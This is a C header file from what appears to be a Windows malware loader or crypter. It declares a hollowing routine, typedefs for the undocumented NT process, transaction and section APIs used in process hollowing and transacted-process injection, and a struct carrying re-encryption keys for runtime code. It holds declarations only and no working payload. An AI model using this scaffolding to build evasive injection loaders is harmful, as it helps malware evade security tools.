#ifndef LOADER_H
#define LOADER_H

#include <windows.h>
#include <tlhelp32.h>
#include <ntdef.h>
#include <winternl.h>
#include <imagehlp.h>
#include <winnt.h>
#include <stdio.h>
#include <ntstatus.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <direct.h>
#include <time.h>
#include "../data/config.h"
#include "../core/cryptor.h"

typedef struct {
    char executablePath[512];
    size_t numFunctions;
    FunctionInfo *functions;
    unsigned char recryptionKey;
    unsigned char nextEncryptionKey;
    UINT_PTR keyAddress;
} ProcessData;

#define SHARED_MEMORY_NAME "Meta\\ProcessInfo"

static const char b64chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

extern void hollowing();

// WIN DEF
#define PS_INHERIT_HANDLES 4
#define NtCurrentProcess() ( (HANDLE)(LONG_PTR) -1 )

typedef NTSTATUS(NTAPI* fpNtCreateProcessEx)
(
    PHANDLE     ProcessHandle,
    ACCESS_MASK  DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes  OPTIONAL,
    HANDLE   ParentProcess,
    ULONG    Flags,
    HANDLE SectionHandle     OPTIONAL,
    HANDLE DebugPort     OPTIONAL,
    HANDLE ExceptionPort     OPTIONAL,
    BOOLEAN  InJob
);

typedef NTSTATUS(NTAPI* fpNtCreateTransaction)
(
    PHANDLE            TransactionHandle,
    ACCESS_MASK        DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    LPGUID             Uow,
    HANDLE             TmHandle,
    ULONG              CreateOptions,
    ULONG              IsolationLevel,
    ULONG              IsolationFlags,
    PLARGE_INTEGER     Timeout,
    PUNICODE_STRING    Description
);

typedef NTSTATUS (NTAPI *fpNtCreateSection)
(
    PHANDLE SectionHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PLARGE_INTEGER MaximumSize,
    ULONG SectionPageProtection,
    ULONG AllocationAttributes,
    HANDLE FileHandle
);


typedef NTSTATUS (NTAPI *fpNtResumeProcess)(
  HANDLE ProcessHandle
);

typedef NTSTATUS (NTAPI *fpNtClose)
(
    HANDLE Handle
);

typedef NTSTATUS(NTAPI* RtlInitUnicodeString_t)
(
    PUNICODE_STRING DestinationString,
    PCWSTR SourceString
);

#define RELOC_32BIT_FIELD 3
#define RELOC_64BIT_FIELD 10

typedef struct _BASE_RELOCATION_ENTRY {
    WORD Offset : 12;
    WORD Type: 4;
} BASE_RELOCATION_ENTRY;

#endif // LOADER_H